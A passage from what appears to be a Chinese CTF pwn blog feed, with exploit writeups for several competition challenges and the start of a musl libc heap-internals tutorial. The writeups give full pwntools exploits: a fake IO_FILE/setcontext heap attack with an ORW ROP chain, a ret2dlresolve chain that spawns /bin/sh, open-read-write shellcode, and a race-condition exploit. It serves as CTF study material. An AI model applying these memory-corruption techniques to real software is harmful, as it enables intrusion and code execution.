class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;~\n&quot;</span>, <span class="string">b&quot;LOGIN | r00t QWBQWXF admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x448</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x448</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Context:\n&quot;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - (<span class="number">0x00007ff1860320d0</span>-<span class="number">0x7ff185e18000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.sym[<span class="string">&quot;stderr&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">ret = libc_base+<span class="number">0x0000000000029cd6</span></span><br><span class="line">orw_addr = heap_base+<span class="number">0x28e0</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">pop_rdx_r12_ret = libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">syscall_ret = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line">orw = <span class="string">b&quot;./flag&quot;</span></span><br><span class="line">orw = orw.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(libc_base+libc.sym[<span class="string">&quot;close&quot;</span>])</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(orw_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall_ret)</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(heap_base) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(libc_base+libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(heap_base) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(libc_base+libc.sym[<span class="string">&quot;write&quot;</span>])</span><br><span class="line"></span><br><span class="line">io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0xb0</span>)<span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x30</span>) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># _mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(orw_addr+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(ret)<span class="comment">#setcontext rcx</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x418</span>, fake_IO_FILE)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x428</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x448</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x448</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>, p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x1350</span>)+p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x448</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x438</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x458</span>, orw)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0xad0</span>)+p64(heap_base+<span class="number">0x2d30</span>-<span class="number">0x20</span>+<span class="number">3</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#add(11, 0x458, b&#x27;anza&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x0177F)&quot;)</span></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x458</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2021强网杯"><a href="#2021强网杯" class="headerlink" title="2021强网杯"></a>2021强网杯</h1><h2 id="1-no-output"><a href="#1-no-output" class="headerlink" title="1. no_output"></a>1. no_output</h2><p>32 位程序。通过 strcpy 会向末尾添加 \x00 的特性覆盖 fd 为 0：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261517699.png" alt="image-20230926151746580" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261518318.png" alt="image-20230926151806275" style="zoom:50%;" /><p>为了触发栈溢出 vuln 函数，给 v1 赋值 -1，v2[0] 赋值 -2147483648，使其正向溢出：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261519706.png" alt="image-20230926151933649" style="zoom:50%;" /><p>由于没有输出函数，需要打 ret2dlresolve 板子，可以直接用 pwntools 自带的工具：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261527552.png" alt="image-20230926152748522" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;hello_boy\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x080492CC&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-2147483648&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">info(rop.dump())</span><br><span class="line"></span><br><span class="line">io.send(fit(&#123;<span class="number">0x4C</span>: rop.chain(), <span class="number">0x100</span>: dlresolve.payload&#125;))</span><br><span class="line"><span class="comment">#0x4c是padding距离，0x100是读入数据多少</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-orw"><a href="#2-orw" class="headerlink" title="2. orw"></a>2. orw</h2><p>附件中有 libseccomp.so.0，可以使用如下命令暂时加载环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=./libseccomp.so.0</span><br></pre></td></tr></table></figure><p>查看沙箱规则，果然只允许 orw：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>checksec 一下，发现 got 表可写，且有 rwx 空间，堆栈均可 rwx：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261649622.png" alt="image-20230926164914818" style="zoom:50%;" /><p>发现是个伪菜单题，idx 可以为负数：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261652158.png" alt="image-20230926165223111" style="zoom:50%;" /><p>size 是个有符号 int 型，在 read_ 中有个漏洞，假如 size 为 0，程序会一直读下去，直至为 \n：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261658413.png" alt="image-20230926165839366" style="zoom:50%;" /><p>EXP 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x67616c66</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice &gt;&gt;\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;index:\n&quot;</span>, <span class="string">b&quot;-25&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size:\n&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;content:\n&quot;</span>, shellcode)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0xFE7)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice &gt;&gt;\n&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;index:\n&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="1-NISACTF-2022-shop-pwn"><a href="#1-NISACTF-2022-shop-pwn" class="headerlink" title="1. [NISACTF 2022]shop_pwn"></a>1. [NISACTF 2022]shop_pwn</h2><p>刚开始只有 100 元，购买 flag 需要 200 元，bags 中只有一支值 99 元的 pen，卖掉也不够 flag 的钱。</p><p>但值得一提的是卖东西的程序是由<code>pthread_create</code>创造的线程去执行，且执行过程中使用了<code>usleep</code>短暂地休眠了，因此可能存在多线程竞争问题，即两个线程在很小的时间间隙内同时卖掉了笔：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141558070.png" alt="image-20230914155829851" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141559592.png" alt="image-20230914155930453" style="zoom:50%;" /><p>EXP 如下，值得注意的是，在 sleep 比较短的情况下打远程最好不要用<code>sendafter</code>、<code>sendlineafter</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">28913</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sell_pen</span>():</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_flag</span>():</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_flag</span>():</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sell_pen()</span><br><span class="line">sell_pen()</span><br><span class="line"></span><br><span class="line">buy_flag()</span><br><span class="line">see_flag()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;复盘、记录近期一些比赛的 wp。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl_pwn</title>
    <link href="http://example.com/2023/09/03/musl-pwn/"/>
    <id>http://example.com/2023/09/03/musl-pwn/</id>
    <published>2023-09-03T04:32:26.000Z</published>
    <updated>2023-09-26T10:44:00.253Z</updated>
    
    <content type="html"><![CDATA[<p>除了学习 glibc 的堆管理机制外，musl 也开始提上行程。</p><p>由于以前总是用模板思路做题，很多东西总是浮于表面，不能很好地系统性理解。因此有了回炉重造的想法，希望能从根本上理解堆管理的机制。</p><span id="more"></span><h2 id="1-Musl简述"><a href="#1-Musl简述" class="headerlink" title="1 Musl简述"></a>1 Musl简述</h2><p>​    musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 <a href="https://zh.wikipedia.org/zh-cn/Alpine_Linux">Alpine Linux</a>（做过 Docker 镜像的应该很熟悉）、<a href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt</a>（常用于路由器）和 Gentoo 等。</p><p>​    musl libc 堆管理器约等同于 dlmalloc（glibc 堆管理器 ptmalloc2 的前身），因此某些部分如 chunk、unbin 与 glibc 十分相似。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码下载路径：</span><br><span class="line">https://git.musl-libc.org/cgit/musl</span><br><span class="line"></span><br><span class="line">编译命令（以1.1.24为例）：</span><br><span class="line">tar -xzvf musl-1.1.24.tar.gz</span><br><span class="line"><span class="built_in">cd</span> musl-1.1.24</span><br><span class="line">sudo su</span><br><span class="line">./configure --prefix=/usr/local/musl CFLAGS=<span class="string">&#x27;-O2 -v&#x27;</span> --enable-debug=<span class="built_in">yes</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">编译完成后，可在 /usr/lib/musl/lib 目录下找到 libc.so</span><br></pre></td></tr></table></figure><h2 id="2-Musl-1-1-24"><a href="#2-Musl-1-1-24" class="headerlink" title="2 Musl 1.1.24"></a>2 Musl 1.1.24</h2><p><code>malloc</code>和<code>free</code>的源码可以在<code>src/malloc/malloc.c</code>中查看，部分结构体和宏定义位于<code>src/internal/malloc_impl.h</code>。</p><h3 id="2-1-数据结构"><a href="#2-1-数据结构" class="headerlink" title="2-1 数据结构"></a>2-1 数据结构</h3><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">        <span class="type">size_t</span> psize, csize;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031304719.png" alt="image-20230903130448645" style="zoom: 67%;" /><p>​    chunk 的结构如上，有点类似于 glibc ，但 chunk 之间不重用 psize，也就是说除了溢出之外，不能通过上一个 chunk 来修改下一个 chunk 的 psize 位。</p><p>​    psize 和 csize 都只有一种位于最低位的标志位 <strong>INUSE</strong>（glibc则有三种），INUSE 位为 1 说明 chunk 正在被使用，若为 0 则说明 chunk 已被释放或者通过 mmap 分配，需要 psize 的标志位进行进一步判断。</p><h4 id="mal-amp-bin"><a href="#mal-amp-bin" class="headerlink" title="mal &amp; bin"></a>mal &amp; bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><p>​    mal 的结构体记录着堆的状态，有三个成员：64位无符号整数 binmap、链表头部数组 bins、锁 free_lock。其中 binmap 记录每个 chunk 是否为空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031404599.png" alt="image-20230903140424558" style="zoom: 80%;" /><p>​    bin 的结构体如上。head 和 tail 指针分别指向头部和尾部的 chunk，同时首部 chunk 的 prev 指针和尾部 chunk 的 next 指针指向了 bin 链表的头部，构成了循环链表。若链表为空，head 和 tail 为 0 或者指向链表头部自身。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031407062.png" alt="image-20230903140736882" style="zoom:80%;" /><p>​    以上为每个 bin 的 chunk 大小范围，前 32 个 bin 类似于 fastbin 和 smallbin，每个 bin 只对应于一种大小的 chunk；后 32 个 bin 类似于 large bin，一个 bin 对应于多种大小的 chunk，例如 bin 下标为 34 时，计算得知 chunk 大小为 0x620~0x700，即可以容纳 0x620、0x640、0x660、0x680、0x6a0、0x6c0、0x6e0、0x700（0x20 递增）大小的 chunk。</p><h3 id="2-2-malloc-实现"><a href="#2-2-malloc-实现" class="headerlink" title="2-2 malloc 实现"></a>2-2 malloc 实现</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 